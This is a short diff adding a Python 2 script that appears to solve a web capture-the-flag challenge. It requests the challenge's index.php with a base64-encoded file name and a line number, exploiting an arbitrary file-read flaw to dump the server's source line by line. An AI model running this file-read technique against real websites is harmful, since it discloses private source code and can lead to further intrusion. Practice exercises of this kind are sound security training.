@@ -1,0 +1,7 @@
+import urllib2
+f=open('index.php','wb')
+for i in xrange(19):
+    url='http://ctf.idf.cn/game/web/40/index.php?line='+str(i)+'&file=aW5kZXgucGhw'
+    html=urllib2.urlopen(url).read()
+    f.write(html)
+f.close()
